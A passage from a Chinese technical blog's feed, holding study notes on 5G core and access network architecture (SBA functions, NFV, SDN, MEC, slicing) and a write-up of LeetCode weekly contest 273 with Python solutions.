src="/2021/12/31/5G基础学习/1.png" alt="1"></p><h4 id="5G网络架构"><a href="#5G网络架构" class="headerlink" title="5G网络架构"></a>5G网络架构</h4><p>针对于上述的三大应用场景，单一的网络很难满足三种网络需求，因此我们可以设置三种网络分别是<code>5G-eMBB</code>网络、<code>5G-uRLLC</code>网络、<code>5G-mMTC</code>网络。这是一种解决办法，但是这样做的成本太高，非常不划算。因此这也成为了5G时代的一种挑战。</p><p><img src="/2021/12/31/5G基础学习/2.png" alt="2"></p><h5 id="基于服务的架构SBA"><a href="#基于服务的架构SBA" class="headerlink" title="基于服务的架构SBA"></a>基于服务的架构SBA</h5><p><img src="/2021/12/31/5G基础学习/3.png" alt="3"></p><p>AMF(Access and Mobility Management Function)：接入和移动性管理功能，类似于4G的MME</p><ul><li>终止RAN CP接口(N2)</li><li>终止NAS(N1)，NAS加密和完整性保护</li><li>注册、连接、可达性和流动性管理</li><li>合法拦截</li><li>为UE和SMF之间的SM消息提供传输</li><li>用于路由SM消息的透明代理</li><li>接入身份验证和接入授权</li></ul><p>SMF(The Session Management Function)：会话管理功能，类似于4G的PGW</p><ul><li>负责与分离的数据面交互，创建、更新和删除PDU会话</li><li>管理与UPF的会话环境</li><li>负责DHCP服务器和IP地址管理系统的功能</li></ul><p>UPF(The User plane Function)：用户面功能</p><ul><li>终端和外部数据的传输</li><li>数据包的路由转发</li><li>应用数据传输的策略</li><li>处理QOS相关功能</li></ul><p>PCF(The Policy Control Function)：策略控制功能</p><ul><li>给整个网络提供配置</li><li>通过访问用户数据库转发策略信息</li></ul><p>NEF(The Network Exposure Function)：网络开放功能</p><ul><li>给外部用户提供一些特定的服务</li></ul><p>NRF(The Network Repository Function)：网络存储库功能</p><ul><li>支持服务发现</li></ul><p>UDM(The Unified Data Management)：统一数据管理</p><ul><li>生成鉴权信息</li></ul><p>AUSF(The Authentication Server Function)：鉴权服务功能</p><ul><li>提供鉴权和接入</li></ul><p>AF(The Application Function)：应用功能</p><ul><li>提供上层的应用功能</li></ul><p>UDR(The Unified Data Repository)：统一数据存储库</p><ul><li>通过UDM来提取存储签约数据</li><li>通过PCF提取存储策略数据</li><li>存储一些结构化的数据</li></ul><p>UDFS(The Unstructured Data Storage Function)：非结构化数据存储功能</p><ul><li>存储一些非结构化的数据</li></ul><p>SMSF(The Short Message Service Function)：短消息服务功能</p><ul><li>短信管理，签约信息管理</li></ul><p>NSSF(The Network Slice Selection function)：网络切片选择功能</p><ul><li>根据UE提供的信息管理特定的网络切片</li></ul><p>5G-EIR(The 5G-Equipment Identity Register)：5G设备认证中心</p><ul><li>检查设备状态</li></ul><p>LMF(The Location Management Function)：位置管理功能</p><ul><li>支持定位相关功能的管理</li></ul><p>SEPP(The Security Edge Protection Proxy)：安全边缘保护代理</p><ul><li>规则定义，数据包过滤</li></ul><p>NWDAF(The Network Data Analytics Function)：网络数据分析功能</p><ul><li>提供基于网络切片的网络数据分析</li></ul><h5 id="网络功能服务框架"><a href="#网络功能服务框架" class="headerlink" title="网络功能服务框架"></a>网络功能服务框架</h5><h5 id="交互机制"><a href="#交互机制" class="headerlink" title="交互机制"></a>交互机制</h5><p>服务使用者和服务提供者之间的交互基于两种机制，分别是</p><ul><li>请求响应机制</li><li>订阅通知机制</li></ul><p><img src="/2021/12/31/5G基础学习/4.png" alt="4"></p><h5 id="注册、发现、授权机制"><a href="#注册、发现、授权机制" class="headerlink" title="注册、发现、授权机制"></a>注册、发现、授权机制</h5><p>服务提供者在上线之后会进行注册，注册通过发送消息给NRF。注册之后，NRF中会存储现在的一个状态服务信息，后续假如有其他服务的使用者想使用这个服务。如下图所示，PCF想使用AMF服务的功能，那么PCF首先会给NRF发送一个服务发现消息。查询NRF中是否存有AMF服务信息，如果有的话，NRF会对PCF进行鉴权，之后PCF会获得AMF的相关服务信息，之后就可以使用请求响应机制来获取AMF相关的服务。</p><p><img src="/2021/12/31/5G基础学习/5.png" alt="5"></p><h5 id="SBI接口协议"><a href="#SBI接口协议" class="headerlink" title="SBI接口协议"></a>SBI接口协议</h5><p><img src="/2021/12/31/5G基础学习/6.png" alt="6"></p><h5 id="5G核心网与EPC交互"><a href="#5G核心网与EPC交互" class="headerlink" title="5G核心网与EPC交互"></a>5G核心网与EPC交互</h5><p><img src="/2021/12/31/5G基础学习/7.png" alt="7"></p><h5 id="5G接入网架构"><a href="#5G接入网架构" class="headerlink" title="5G接入网架构"></a>5G接入网架构</h5><p><img src="/2021/12/31/5G基础学习/8.png" alt="8"></p><h5 id="5G和4G接入网对比"><a href="#5G和4G接入网对比" class="headerlink" title="5G和4G接入网对比"></a>5G和4G接入网对比</h5><p><img src="/2021/12/31/5G基础学习/9.png" alt="9"></p><h5 id="5G接入网CU-DU"><a href="#5G接入网CU-DU" class="headerlink" title="5G接入网CU/DU"></a>5G接入网CU/DU</h5><p><img src="/2021/12/31/5G基础学习/10.png" alt="10"></p><p>可以看到，在CU中又划分为用户面和控制面，之间通过E1接口来连接。从而形成了控制面<code>CU-CP</code>和用户面<code>CU-UP</code>。分离的好处一是可以进行集中化的控制，二是可以灵活的部署。</p><p>这里需要注意的是，一个DU只能连接到一个<code>CU-CP</code>，一个<code>CU-UP</code>也只能连接到一个<code>CU-CP</code>，一个DU可以连接到一个<code>CU-CP</code>控制下的多个<code>CU-UP</code>，一个<code>CU-UP</code>可以连接到一个<code>CU-CP</code>控制下的多个DU。</p><h5 id="5G网络部署选项"><a href="#5G网络部署选项" class="headerlink" title="5G网络部署选项"></a>5G网络部署选项</h5><p><img src="/2021/12/31/5G基础学习/11.png" alt="11"></p><p><img src="/2021/12/31/5G基础学习/12.png" alt="12"></p><p><img src="/2021/12/31/5G基础学习/13.png" alt="13"></p><h4 id="5G关键技术"><a href="#5G关键技术" class="headerlink" title="5G关键技术"></a>5G关键技术</h4><p><img src="/2021/12/31/5G基础学习/14.png" alt="14"></p><h5 id="NFV-网络功能虚拟化"><a href="#NFV-网络功能虚拟化" class="headerlink" title="NFV(网络功能虚拟化)"></a>NFV(网络功能虚拟化)</h5><p>NFV技术是一种将网络功能整合到行业标准的服务器、交换机和存储硬件上，并且提供优化的虚拟化数据平面，可通过服务器上运行的软件让管理员取代传统物理网络设备的技术。</p><p>NFV实现了软硬件的解耦，如下图所示</p><p><img src="/2021/12/31/5G基础学习/15.png" alt="15"></p><h6 id="NFV的好处"><a href="#NFV的好处" class="headerlink" title="NFV的好处"></a>NFV的好处</h6><ul><li>成本低</li><li>灵活性高</li><li>部署快</li><li>开放性高</li><li>配置简单</li></ul><h6 id="NFV架构"><a href="#NFV架构" class="headerlink" title="NFV架构"></a>NFV架构</h6><p><img src="/2021/12/31/5G基础学习/16.png" alt="16"></p><ul><li>VNF(Virtualized Network Function)：虚拟化的网络功能</li><li>EM(Element Management)：网元管理功能</li><li>Hardware Resources：硬件资源</li><li>Virtualisation Layer and Virtualised Resources：虚拟化层及虚拟资源</li><li>VIM(Virtualised infrastructure Managers)：虚拟化基础设施管理器</li><li>VNFM(VNF Managers)：虚拟化网络功能管理器</li><li>NFVO(NFV Orchestrator)：网络功能虚拟化编排器</li></ul><h6 id="NFV集成方式"><a href="#NFV集成方式" class="headerlink" title="NFV集成方式"></a>NFV集成方式</h6><p><img src="/2021/12/31/5G基础学习/17.png" alt="17"></p><p>NFV带来的挑战</p><p><img src="/2021/12/31/5G基础学习/18.png" alt="18"></p><h5 id="SDN-软件定义网络"><a href="#SDN-软件定义网络" class="headerlink" title="SDN(软件定义网络)"></a>SDN(软件定义网络)</h5><p>SDN的设计思路其实和NFV一样，都是通过解耦来实现系统灵活性的提升。NFV是软硬件解耦，而SDN是控制平面和转发平面解耦。传统网络中，各个转发节点（例如路由器、交换机）都是独立工作的，内部管理命令和接口也是厂商私有的，不对外开放。而SDN网络，就是在网络之上建立了一个SDN控制器节点，统一管理和控制下层设备的数据转发。所有的下级节点，管理功能被剥离（交给了SDN控制器），只剩下转发功能。如下图对比所示</p><p><img src="/2021/12/31/5G基础学习/19.png" alt="19"></p><h6 id="SDN架构"><a href="#SDN架构" class="headerlink" title="SDN架构"></a>SDN架构</h6><p><img src="/2021/12/31/5G基础学习/20.png" alt="20"></p><p>最底层是基础设施层，专注于数据和业务转发。中间层是控制层，集中管理网络设备，将整个网络虚拟化成一种资源池，根据用户需求灵活分配资源。最上层是应用层，可以根据各种API接口对底层设备进行编程，从而开发各种业务应用。</p><h6 id="SDN应用场景"><a href="#SDN应用场景" class="headerlink" title="SDN应用场景"></a>SDN应用场景</h6><p>核心网SDN化</p><ul><li>提升转发性能</li><li>提升网络可靠性</li><li>促进网络扁平化部署</li><li>提升业务创新能力</li></ul><h5 id="SDN与NFV的关系"><a href="#SDN与NFV的关系" class="headerlink" title="SDN与NFV的关系"></a>SDN与NFV的关系</h5><p><img src="/2021/12/31/5G基础学习/21.png" alt="21"></p><h5 id="MEC-移动边缘计算"><a href="#MEC-移动边缘计算" class="headerlink" title="MEC(移动边缘计算)"></a>MEC(移动边缘计算)</h5><p>MEC的基本思想是把云计算平台从移动核心网络内部迁移到移动接入网边缘，通过部署具备计算、存 储、通信等功能的边缘节点，使传统无线接入网具备业务本地化条件，进一步为终端用户提供更高带宽、更低时延的数据服务，并大幅度减少核心网的网络负荷，同时降低数据业务对网络回传的带宽要求。</p><h6 id="MEC实现方式"><a href="#MEC实现方式" class="headerlink" title="MEC实现方式"></a>MEC实现方式</h6><p><img src="/2021/12/31/5G基础学习/22.png" alt="22"></p><p>传统的网络应用终端要通过核心网去连接，从终端到核心网到基站再到应用。引入边缘计算是通过在靠近接入网的位置加入MEC功能。其中MEC中包括接入网的CU，UPF和边缘计算的APP。因此我们可以通过边缘计算访问到我们需要的APP，可以提高用户的访问速度。因为5G采用的是SBA架构，将用户面和控制面彻底分离，因此用户面的功能完全是由UPF控制的，所以UPF可以和接入网一起部署在靠近用户的无线接入网的地方，配合MEC独立使用。</p><h6 id="MEC架构"><a href="#MEC架构" class="headerlink" title="MEC架构"></a>MEC架构</h6><p><img src="/2021/12/31/5G基础学习/23.png" alt="23"></p><h6 id="MEC部署方式"><a href="#MEC部署方式" class="headerlink" title="MEC部署方式"></a>MEC部署方式</h6><p><img src="/2021/12/31/5G基础学习/24.png" alt="24"></p><h6 id="MEC应用场景"><a href="#MEC应用场景" class="headerlink" title="MEC应用场景"></a>MEC应用场景</h6><ul><li>本地分流<ul><li>企业园区</li><li>校园</li><li>本地视频监控</li><li>VR/AR</li><li>本地视频直播</li><li>边缘CDN</li></ul></li><li>数据服务<ul><li>室内定位</li><li>车联网</li></ul></li><li>业务优化<ul><li>视频QoS优化</li><li>视频直播和游戏加速</li></ul></li></ul><h5 id="NS-网络切片"><a href="#NS-网络切片" class="headerlink" title="NS(网络切片)"></a>NS(网络切片)</h5><p>一个5G网络切片是一组网络功能，运行这些网络功能的资源以及这些网络功能特定的配置所组成的集合，这些网络功能及其相应的配置形成一个完整的逻辑网络，这个逻辑网络包含满足特定业务所需要的网络特征，为此特定的业务场景提供相应的网络服务。</p><p>网络切片的优势</p><p>网络切片允许共享同一基础设施的运营者为切片配置网络以及定义具体功能，并且可以根据运营者的策略通过SDN、NFV灵活地动态创造以及撤销切片。这样可以灵活地管理网络资源，通过只提供必要的网络资源以满足服务需求来极大的提高网络资源的利用率。</p><h6 id="端到端网络切片的实现"><a href="#端到端网络切片的实现" class="headerlink" title="端到端网络切片的实现"></a>端到端网络切片的实现</h6><p><img src="/2021/12/31/5G基础学习/25.png" alt="25"></p><h6 id="核心网切片"><a href="#核心网切片" class="headerlink" title="核心网切片"></a>核心网切片</h6><p><img src="/2021/12/31/5G基础学习/26.png" alt="26"></p><p><img src="/2021/12/31/5G基础学习/27.png" alt="27"></p><p><img src="/2021/12/31/5G基础学习/28.png" alt="28"></p><h6 id="核心网切片选择"><a href="#核心网切片选择" class="headerlink" title="核心网切片选择"></a>核心网切片选择</h6><p><img src="/2021/12/31/5G基础学习/29.png" alt="29"></p><h6 id="传输网切片"><a href="#传输网切片" class="headerlink" title="传输网切片"></a>传输网切片</h6><p><img src="/2021/12/31/5G基础学习/30.png" alt="30"></p><h6 id="接入网切片"><a href="#接入网切片" class="headerlink" title="接入网切片"></a>接入网切片</h6><p><img src="/2021/12/31/5G基础学习/31.png" alt="31"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;5G介绍&quot;&gt;&lt;a href=&quot;#5G介绍&quot; class=&quot;headerlink&quot; title=&quot;5G介绍&quot;&gt;&lt;/a&gt;5G介绍&lt;/h4&gt;&lt;p&gt;5G 是指第五代移动网络。它旨在扩展现有的 4G LTE 蜂窝网络，甚至完全取代它们。每一代技术都是由几个因素决定的，例如所
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第273场周赛write up</title>
    <link href="elssm.github.io/2021/12/26/Leetcode%E7%AC%AC273%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/12/26/Leetcode第273场周赛write-up/</id>
    <published>2021-12-26T08:12:20.000Z</published>
    <updated>2021-12-26T09:00:20.422Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反转两次的数字"><a href="#反转两次的数字" class="headerlink" title="反转两次的数字"></a>反转两次的数字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反转 一个整数意味着倒置它的所有位。</span><br><span class="line">例如，反转 2021 得到 1202 。反转 12300 得到 321 ，不保留前导零 。</span><br><span class="line">给你一个整数 num ，反转 num 得到 reversed1 ，接着反转 reversed1 得到 reversed2 。如果 reversed2 等于 num ，返回 true ；否则，返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：num = 526</span><br><span class="line">输出：true</span><br><span class="line">解释：反转 num 得到 625 ，接着反转 625 得到 526 ，等于 num 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：num = 1800</span><br><span class="line">输出：false</span><br><span class="line">解释：反转 num 得到 81 ，接着反转 81 得到 18 ，不等于 num 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：num = 0</span><br><span class="line">输出：true</span><br><span class="line">解释：反转 num 得到 0 ，接着反转 0 得到 0 ，等于 num 。</span><br></pre></td></tr></table></figure><p>这道题分两种情况，最后一位是0和最后一位不是0。</p><p>如果最后一位是不是0，直接返回True</p><p>如果最后一位是0，分这个数是0还是其他数字。如果这个数是0，直接回返True，如果这个数不是0，直接返回False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSameAfterReversals</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> num%<span class="number">10</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="执行所有后缀指令"><a href="#执行所有后缀指令" class="headerlink" title="执行所有后缀指令"></a>执行所有后缀指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">现有一个 n x n 大小的网格，左上角单元格坐标 (0, 0) ，右下角单元格坐标 (n - 1, n - 1) 。给你整数 n 和一个整数数组 startPos ，其中 startPos = [startrow, startcol] 表示机器人最开始在坐标为 (startrow, startcol) 的单元格上。</span><br><span class="line">另给你一个长度为 m 、下标从 0 开始的字符串 s ，其中 s[i] 是对机器人的第 i 条指令：&apos;L&apos;（向左移动），&apos;R&apos;（向右移动），&apos;U&apos;（向上移动）和 &apos;D&apos;（向下移动）。</span><br><span class="line">机器人可以从 s 中的任一第 i 条指令开始执行。它将会逐条执行指令直到 s 的末尾，但在满足下述条件之一时，机器人将会停止：</span><br><span class="line">下一条指令将会导致机器人移动到网格外。</span><br><span class="line">没有指令可以执行。</span><br><span class="line">返回一个长度为 m 的数组 answer ，其中 answer[i] 是机器人从第 i 条指令 开始 ，可以执行的指令数目。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 3, startPos = [0,1], s = &quot;RRDDLU&quot;</span><br><span class="line">输出：[1,5,4,3,1,0]</span><br><span class="line">解释：机器人从 startPos 出发，并从第 i 条指令开始执行：</span><br><span class="line">- 0: &quot;RRDDLU&quot; 在移动到网格外之前，只能执行一条 &quot;R&quot; 指令。</span><br><span class="line">- 1:  &quot;RDDLU&quot; 可以执行全部五条指令，机器人仍在网格内，最终到达 (0, 0) 。</span><br><span class="line">- 2:   &quot;DDLU&quot; 可以执行全部四条指令，机器人仍在网格内，最终到达 (0, 0) 。</span><br><span class="line">- 3:    &quot;DLU&quot; 可以执行全部三条指令，机器人仍在网格内，最终到达 (0, 0) 。</span><br><span class="line">- 4:     &quot;LU&quot; 在移动到网格外之前，只能执行一条 &quot;L&quot; 指令。</span><br><span class="line">- 5:      &quot;U&quot; 如果向上移动，将会移动到网格外。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 2, startPos = [1,1], s = &quot;LURD&quot;</span><br><span class="line">输出：[4,1,0,0]</span><br><span class="line">解释：</span><br><span class="line">- 0: &quot;LURD&quot;</span><br><span class="line">- 1:  &quot;URD&quot;</span><br><span class="line">- 2:   &quot;RD&quot;</span><br><span class="line">- 3:    &quot;D&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 1, startPos = [0,0], s = &quot;LRUD&quot;</span><br><span class="line">输出：[0,0,0,0]</span><br><span class="line">解释：无论机器人从哪条指令开始执行，都会移动到网格外。</span><br></pre></td></tr></table></figure><p>这道题，拿到手，我就直接上<code>if else</code>。分别对上下左右进行边界判断，如果字符串最终走完了，那么说明该字符串的指令都可以执行，如果执行到一半退出了，那么说明越界了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">executeInstructions</span><span class="params">(self, n, startPos, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type startPos: List[int]</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">          <span class="comment">#flag用来标记是否在字符串中间退出</span></span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            tmpPos = startPos[:]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i, len(s)):</span><br><span class="line">                <span class="keyword">if</span> s[j] == <span class="string">'L'</span>:</span><br><span class="line">                    tmpPos[<span class="number">1</span>] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'R'</span>:</span><br><span class="line">                    tmpPos[<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">1</span>] &gt;= n:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'U'</span>:</span><br><span class="line">                    tmpPos[<span class="number">0</span>] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">0</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'D'</span>:</span><br><span class="line">                    tmpPos[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">0</span>] &gt;= n:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                res.append(len(s) - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>做第三题之前，我们先来做一下<code>Leetcode</code>1685题，第三题和这道题类似。</p><h4 id="有序数组中差绝对值之和"><a href="#有序数组中差绝对值之和" class="headerlink" title="有序数组中差绝对值之和"></a>有序数组中差绝对值之和</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个 非递减 有序整数数组 nums 。</span><br><span class="line">请你建立并返回一个整数数组 result，它跟 nums 长度相同，且result[i] 等于 nums[i] 与数组中所有其他元素差的绝对值之和。</span><br><span class="line">换句话说， result[i] 等于 sum(|nums[i]-nums[j]|) ，其中 0 &lt;= j &lt; nums.length 且 j != i （下标从 0 开始）。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [2,3,5]</span><br><span class="line">输出：[4,3,5]</span><br><span class="line">解释：假设数组下标从 0 开始，那么</span><br><span class="line">result[0] = |2-2| + |2-3| + |2-5| = 0 + 1 + 3 = 4，</span><br><span class="line">result[1] = |3-2| + |3-3| + |3-5| = 1 + 0 + 2 = 3，</span><br><span class="line">result[2] = |5-2| + |5-3| + |5-5| = 3 + 2 + 0 = 5。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [1,4,6,8,10]</span><br><span class="line">输出：[24,15,13,15,21]</span><br></pre></td></tr></table></figure><p>初看这道题，我眼前一亮，一上来就是一个双重循环。多么美妙的手法啊！写完之后，执行代码没有问题，点击提交，多么优雅！过了三秒，如下图所示，我知道我大意了。</p><p><img src="/2021/12/26/Leetcode第273场周赛write-up/1.png" alt="1"></p><p>思索数分钟后，我点击了<code>相关标签</code>这个选项，试图寻找一丝灵感。相关标签里写到了三个大字，前缀和。我恍然大悟。接下来，我将通过如下的思路来进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">解题思路：</span><br><span class="line">        因为是有序排列，因此后一个减去前一个肯定是正数，无论是否加绝对值</span><br><span class="line">        考虑nums = 2 3 5 6这四个数</span><br><span class="line">        res1 = |2-2|+|2-3|+|2-5|+|2-6|</span><br><span class="line">        从第二个绝对值开始，结果都要取反，不考虑相等的值</span><br><span class="line">        将res1改为</span><br><span class="line">        res1 = 2-2+3-2+5-2+6-2 = sum(nums)-2*len(nums)</span><br><span class="line">        </span><br><span class="line">        res2 = |3-2|+|3-3|+|3-5|+|3-6|</span><br><span class="line">        从第三个绝对值开始，结果都要取反，不考虑相等的值</span><br><span class="line">        将res2改为</span><br><span class="line">        res2 = 3-2+3-3+5-3+6-3，其中为了凑到sum(res1)</span><br><span class="line">        我们将 3-2 凑成 (2-3)+(3-2)*2</span><br><span class="line">        则res2 = sum(nums)-3*len(nums) + (3-2)*2</span><br><span class="line">        </span><br><span class="line">        res3 = |5-2|+|5-3|+|5-5|+|5-6|</span><br><span class="line">        从第四个绝对值开始，结果都要取反，不考虑相等的值</span><br><span class="line">        将res3改为</span><br><span class="line">        res3 = 5-2+5-3+5-5+6-5，其中为了凑到sum(res1)</span><br><span class="line">        我们将 5-2+5-3 凑成 (2-5+3-5)+(5-2+5-3)*2</span><br><span class="line">        则res2 = sum(nums)-5*len(nums) + (5-2+5-3)*2</span><br><span class="line">        </span><br><span class="line">        res4 = |6-2|+|6-3|+|6-5|+|6-6|</span><br><span class="line">        将res4改为</span><br><span class="line">        res4 = 6-2+6-3+6-5+6-6，其中为了凑到sum(res1)</span><br><span class="line">        我们将 6-2+6-3+6-5 凑成 (2-6+3-6+5-6)+(6-2+6-3+6-5)*2</span><br><span class="line">        则res2 = sum(nums)-6*len(nums) + (6-2+6-3+6-5)*2</span><br><span class="line">        </span><br><span class="line">        通过上述分析我们最终可以得到第i个数的结果为</span><br><span class="line">        res[i] = (sum(nums)-nums[i]*len(nums)+(nums[i]*i - sum(1...i))*2</span><br></pre></td></tr></table></figure><p>如果你看懂了上面的分析过程，那么代码写起来将会非常容易。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSumAbsoluteDifferences</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        n = len(nums)</span><br><span class="line">        sums = sum(nums)</span><br><span class="line">        tmp_sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">            tmp_sum += nums[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>现在让我们回到本周周赛的第三题</p><h4 id="相同元素的间隔之和"><a href="#相同元素的间隔之和" class="headerlink" 